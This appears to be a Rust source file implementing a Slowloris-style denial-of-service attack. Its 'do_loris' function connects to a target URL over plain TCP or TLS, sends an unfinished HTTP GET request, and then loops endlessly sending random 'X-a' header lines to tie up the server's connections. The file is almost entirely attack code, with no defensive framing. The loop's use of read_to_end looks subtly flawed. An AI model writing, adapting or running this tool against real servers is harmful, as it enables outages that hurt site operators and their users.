extern crate native_tls;
extern crate url;
extern crate rand;
use url::Url;

use native_tls::{TlsConnector, TlsStream};
use std::io::{self, Read, Write};
use std::net::TcpStream;


enum Stream<S>
where
    S: Read + Write,
{
    Tls(TlsStream<S>),
    Plain(S),
}

impl<S> Read for Stream<S>
where
    S: Read + Write,
{
    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        match self {
            &mut Stream::Tls(ref mut stream) => stream.read(buf),
            &mut Stream::Plain(ref mut stream) => stream.read(buf),
        }
    }
}

impl<S> Write for Stream<S>
where
    S: Read + Write,
{
    fn write(&mut self, buf: &[u8]) -> io::Result<usize> {
        match self {
            &mut Stream::Tls(ref mut stream) => stream.write(buf),
            &mut Stream::Plain(ref mut stream) => stream.write(buf),
        }
    }

    fn flush(&mut self) -> io::Result<()> {
        match self {
            &mut Stream::Tls(ref mut stream) => stream.flush(),
            &mut Stream::Plain(ref mut stream) => stream.flush(),
        }
    }
}

pub fn do_loris(url: &str) {
    let url = Url::parse(url).unwrap();


    /*
    assert!(url.scheme() == "https");
    assert!(url.username() == "");
    assert!(url.password() == None);
    assert!(url.host_str() == Some("github.com"));
    assert!(url.host() == Some(Host::Domain("github.com")));
    assert!(url.port() == None);
    assert!(url.path() == "/rust-lang/rust/issues");
    assert!(
        url.path_segments().map(|c| c.collect::<Vec<_>>()) ==
            Some(vec!["rust-lang", "rust", "issues"])
    );
    assert!(url.query() == Some("labels=E-easy&state=open"));
    assert!(url.fragment() == None);
    assert!(!url.cannot_be_a_base());
    */

    let mut stream = get_stream(&url);
    let init_header = get_init_header(&url);
    stream.write_all(&init_header).unwrap();
    let mut res = vec![];
    loop {
        let loris_header = get_loris_header();
        stream.write_all(&loris_header).unwrap();
        stream.read_to_end(&mut res).unwrap();
        //println!("{}", String::from_utf8_lossy(&res));
    }
}


fn get_stream(url: &Url) -> Stream<TcpStream> {
    let domain = url.host_str().unwrap();
    let port = url.port_or_known_default().unwrap();
    let stream = TcpStream::connect((domain, port)).unwrap();
    if url.scheme() == "https" {
        let connector = TlsConnector::builder().unwrap().build().unwrap();
        Stream::Tls(connector.connect(domain, stream).unwrap())
    } else {
        Stream::Plain(stream)
    }
}

fn get_init_header(url: &Url) -> Vec<u8> {
    format!(
        "GET {} HTTP/1.1\r\n\
         Host: {}\r\n",
        url.path(),
        url.host_str().unwrap()
    ).as_bytes()
        .to_vec()
}

fn get_loris_header() -> Vec<u8> {
    format!(
        "X-a: {}\r\n",
        rand::random::<u32>(),
    ).as_bytes()
        .to_vec()
}
